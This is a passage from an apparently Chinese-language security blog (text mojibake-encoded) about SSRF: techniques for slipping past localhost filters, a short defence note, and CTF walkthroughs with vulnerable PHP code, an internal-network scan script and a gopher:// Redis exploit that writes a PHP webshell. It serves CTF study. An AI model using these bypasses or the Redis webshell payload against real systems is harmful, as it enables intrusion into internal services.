<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">115.239</span><span class="number">.210</span><span class="number">.26</span>  &gt;&gt;&gt;  <span class="number">16373751032</span></span><br><span class="line">é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ<span class="number">16</span>è¿›åˆ¶ï¼Œç»“æœï¼š<span class="number">73</span> ef d2 <span class="number">1</span>a</span><br><span class="line">ç„¶åæŠŠ <span class="number">73</span>efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ<span class="number">8</span>è¿›åˆ¶</span><br><span class="line">è®°å¾—è®¿é—®çš„æ—¶å€™åŠ <span class="number">0</span>è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª<span class="number">0</span>ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  &gt;&gt;&gt;  http://<span class="number">2130706433</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>è§£æurlçš„ç»•è¿‡</li>
</ul>
<p>å½“åç«¯ç¨‹åºé€šè¿‡ä¸æ­£ç¡®çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚å°†httpä¹‹ååˆ°comä¸ºæ­¢çš„å­—ç¬¦å†…å®¹ï¼Œä¹Ÿå°±æ˜¯<code>www.baidu.com</code>ï¼Œè®¤ä¸ºæ˜¯è®¿é—®è¯·æ±‚çš„hoståœ°å€æ—¶ï¼‰å¯¹ä¸Šè¿°URLçš„å†…å®¹è¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šè®¤ä¸ºè®¿é—®URLçš„hostä¸º<code>www.baidu.com</code>ï¼Œè€Œå®é™…ä¸Šè¿™ä¸ªURLæ‰€è¯·æ±‚çš„å†…å®¹éƒ½æ˜¯127.0.0.1ä¸Šçš„å†…å®¹ã€‚</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.baidu.com@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br><span class="line"><span class="comment">#ç›¸å½“äº</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œä¾‹å¦‚ï¼š <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>ï¼Œåœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«<code>www.ccc.com</code>ï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸º<code>www.bbb.com</code>ã€‚</p>
<ul>
<li>å®šåˆ¶DNSæœåŠ¡</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://xip.io/</span><br><span class="line">http://nip.io/</span><br><span class="line">https://ip6.name/</span><br><span class="line">https://sslip.io/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io/</span><br><span class="line"><span class="comment">#ç›¸å½“äº</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>å°é—­å¼æ•°å­—å­—æ¯</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </span><br><span class="line"><span class="comment">#ç›¸å½“äº</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>çŸ­åœ°å€ç»•è¿‡</li>
</ul>
<p>é€šè¿‡çŸ­åœ°å€çš„æ–¹å¼æ¥ç»•è¿‡ï¼ŒçŸ­åœ°å€ç”Ÿæˆç½‘ç«™ï¼š<a target="_blank" rel="noopener" href="https://tinyurl.com/">https://tinyurl.com/</a></p>
<h1 id="ssrfæ€ä¹ˆé˜²"><a href="#ssrfæ€ä¹ˆé˜²" class="headerlink" title="ssrfæ€ä¹ˆé˜²"></a><strong>ssrfæ€ä¹ˆé˜²</strong></h1><p>ç¦ç”¨ä¸éœ€è¦çš„åè®®ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äº <code>file://</code>, <code>gopher://</code>, <code>ftp://</code> ç­‰å¼•èµ·çš„é—®é¢˜ã€‚</p>
<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a><strong>ä¾‹é¢˜</strong></h1><p>è¿™äº›é¢˜ç›®éƒ½æ˜¯ä»¥å‰å¤ç°çš„é¢˜ç›®ï¼Œå½“æ—¶çœ‹çš„äº‘é‡Œé›¾é‡Œï¼Œç°åœ¨å›å¤´æ¥çœ‹åˆåŠ æ·±äº†ç†è§£ã€‚</p>
<h2 id="SSRFçš„PHPé»‘é­”æ³•"><a href="#SSRFçš„PHPé»‘é­”æ³•" class="headerlink" title="SSRFçš„PHPé»‘é­”æ³•"></a><strong>SSRFçš„PHPé»‘é­”æ³•</strong></h2><p>è¿™æ˜¯hhhmå¸ˆå‚…å‡ºçš„é¢˜ç›®ä¸‰åº§å¤§å±±</p>
<p>åšè¿™é“é¢˜ç›®ä¹‹å‰å…ˆæ¥äº†è§£ä¸€ä¸‹SSRFçš„PHPé»‘é­”æ³•ï¼Œ<code>file_get_contents()</code>å‡½æ•°å¦‚æœè¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„åè®®åï¼Œä¼šçˆ†å‡ºä¸€ä¸ªwarningï¼Œç„¶åå¯¼è‡´ç›®å½•ç©¿è¶Šï¼Œä»è€Œå®ç°SSRFæ”»å‡»ï¼Œæ¯”å¦‚æˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªPHPæ— æ³•è¯†åˆ«çš„åè®®ï¼Œæ¯”å¦‚<code>abc://</code>ï¼Œé‚£ä¹ˆä»–å°±ä¼šå°±è¢«PHPè¯†åˆ«ä¸ºäº†ä¸€ä¸ªç›®å½•ï¼Œå¦‚æœè¦è¯»å–åŒç›®å½•ä¸‹çš„index.phpï¼Œå°±è¦ç”¨<code>abc://../injiahsdex.php</code>æ¥è¿›è¡Œè¯»å–ã€‚è¿™æ ·åšçš„ç›®çš„å°±æ˜¯å¯ä»¥åœ¨SSRFçš„ä¼—å¤šåè®®è¢«bançš„æƒ…å†µä¸‹æ¥è¿›è¡Œè¯»å–æ–‡ä»¶ã€‚</p>
<p>å›åˆ°é¢˜ç›®ï¼Œé¦–å…ˆæŒ‰ç…§ç¤ºä¾‹è¾“å…¥oneï¼Œè¾“å‡ºä¸€å¼ é£æ™¯ç”»ï¼Œä¾ç…§æç¤ºå¯çŸ¥è¾“å…¥twoï¼ŒthreeåŒç†ä¼šæœ‰å›¾ç‰‡ï¼Œfuzzä¸€ä¸‹å‘ç°æœ‰æç¤ºï¼š</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">can you pass it and then read index.php? </span><br></pre></td></tr></table></figure>

<p>è¯»æ–‡ä»¶çš„è¯ä¸€èˆ¬æ˜¯ssrfï¼Œä»fuzzçš„ç»“æœä¼šå‘ç°è¾“å…¥åè®®ç›¸å…³çš„å†…å®¹å°±ä¼šè¢«è¿‡æ»¤æ‰ï¼Œå…¶ä¸­è¿‡æ»¤äº†å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™åˆ©ç”¨phpçš„é»‘é­”æ³•<code>abc://../index.php</code>å°±å¯ä»¥è¯»å–æœ¬åœ°çš„index.phpã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$name = $_GET[<span class="string">&quot;num&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($name))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($name===<span class="string">&quot;one&quot;</span>||$name===<span class="string">&quot;two&quot;</span>||$name===<span class="string">&quot;three&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = <span class="string">&quot;tour/<span class="subst">$name</span>.php&quot;</span>;</span><br><span class="line">         <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:|input|filter|flag/i&#x27;</span>,$name))</span><br><span class="line">          &#123;</span><br><span class="line">            $url=file_get_contents($name);</span><br><span class="line">            <span class="keyword">echo</span>($url);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;can you pass it and then read index.php? &quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#&lt;!---next c2Vzcw==.php--&gt; </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ç›®åé¢è¿˜æœ‰ä¸€éƒ¨åˆ†æ— å‚æ•°ï¼Œä¸æ¶‰åŠSSRFè¿™é‡Œå°±ä¸æäº†ã€‚</p>
<h2 id="Redis-SSRF-getshell"><a href="#Redis-SSRF-getshell" class="headerlink" title="Redis SSRF getshell"></a><strong>Redis SSRF getshell</strong></h2><p>buué¢˜ç›®EZä¸‰å‰‘å®¢-EzWebï¼Œé¦–å…ˆå¾—åˆ°çš„é¡µé¢æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†</p>
<p>å½“æˆ‘ä»¬è¾“å…¥<code>file:///etc/passwd</code>çš„æ—¶å€™ï¼Œä¸‹æ–¹æç¤ºåˆ«è¿™æ ·ï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº†fileåè®®ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>file:&lt;ç©ºæ ¼&gt;///</code>ç»•è¿‡ï¼ŒæˆåŠŸå›æ˜¾ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæœ‰SSRFæ¼æ´äº†ã€‚ç„¶åæˆ‘ä»¬å†ä½¿ç”¨fileåè®®è¯»å–æºç è¯•ä¸€ä¸‹ï¼Œåœ¨è¾“å…¥æ¡†è¾“å…¥<code>file: ///var/www/html/index.php</code>ï¼ŒæˆåŠŸè·å–æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;åˆ«è¿™æ ·&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç»è¿‡äº†ä¸€ä¸ªæ­£åˆ™çš„åŒ¹é…æ‰å¯ä»¥<code>curl($url);</code>ã€‚</p>
<p>ä»æ­£åˆ™å¯ä»¥çœ‹å‡ºè¿‡æ»¤äº†<code>file://</code>ï¼Œ<code>dict</code>ï¼Œ<code>127.0.0.1</code>ï¼Œ<code>localhost</code>ï¼Œ<code>../</code>ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ã€‚çœ‹åˆ°å¦‚æœgetä¼ å€¼secretä¼šæ‰§è¡Œifconfigã€‚</p>
<p>æŒ‰F12åœ¨æœ‰ä¸ªæ³¨é‡Šä¹Ÿå¯ä»¥å‘ç°?secretï¼Œè®¿é—®?secretå¾—åˆ°æœ¬æœºip</p>
<img src="http://img.kawhi.xyz/image-20200527114207278.png" style="high:80%;width:80%;" />

<p>å†™ä¸ªè„šæœ¬æ¢æµ‹å†…ç½‘</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=æäº¤&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºç»“æœ4 5 6 7 10 11ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œ11çš„æ—¶å€™ç»™å‡ºäº†æç¤ºï¼Œå½“ç„¶è¿™é‡Œä¸ç”¨å†™è„šæœ¬ï¼Œç”¨burpå»çˆ†ç ´ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<p>è·å–åˆ°åœ°å€ä¹‹åï¼Œç„¶åç”¨burpçˆ†ç ´ç«¯å£ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200527114920600.png" style="high:80%;width:80%;" />

<p>payloadsé€‰numbersçˆ†ç ´1åˆ°65535ç«¯å£ï¼Œçº¿ç¨‹é€‰1ã€‚ä¸€èˆ¬æ¥è¯´çŒœæµ‹æ˜¯6379ç«¯å£ï¼ˆredisï¼‰æˆ–3306ç«¯å£ï¼ˆmysqlï¼‰ï¼Œå½“ç„¶çˆ†ç ´å‡ºç»“æœæ˜¯6374ã€‚</p>
<p>å› ä¸ºè¾“å…¥urlè¿™é‡Œåªé™åˆ¶äº†<code>file://</code>ï¼Œæ²¡æœ‰banæ‰<code>gopher://</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯Redis SSRF getshellã€‚</p>
<p>è¿™é‡Œç›´æ¥ç”¨åˆ«äººå†™å¥½çš„expï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>payloadä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>åœ¨è¾“å…¥æ¡†ç›´æ¥æ‰“è¿›å»ã€‚ä¼šåœ¨æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸ªæ–‡ä»¶shell.phpï¼Œç„¶åè®¿é—®173.17.51.11/shell.phpå³å¯å¾—åˆ°flagã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="kawhi"
      src="http://yuhaojiang.gitee.io/picture/Blogå¤´åƒ.jpg">
  <p class="site-author-name" itemprop="name">kawhi</p>
  <div class="site-description" itemprop="description">æ²¡æœ‰æ³¢æ¶›ï¼Œå¦‚ä½•æ±¹æ¶Œ</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">24</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      å‹æƒ…é“¾æ¥
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.tattooo.top/" title="https:&#x2F;&#x2F;www.tattooo.top" rel="noopener" target="_blank">Tattoo's Blog</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://www.plasf.cn/" title="https:&#x2F;&#x2F;www.plasf.cn&#x2F;" rel="noopener" target="_blank">Xiao Leung's Blog</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">kawhi</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
